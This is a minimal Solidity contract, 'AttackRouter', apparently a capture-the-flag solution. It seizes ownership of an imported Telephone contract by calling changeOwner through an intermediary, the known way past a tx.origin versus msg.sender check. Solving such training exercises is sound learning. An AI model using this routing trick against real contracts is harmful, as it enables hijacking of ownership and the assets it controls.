// SPDX License Identifier: MIT

pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract AttackRouter {

    function attack(address telephoneContract, address newOwner) public {
        Telephone(telephoneContract).changeOwner(newOwner);
    }

}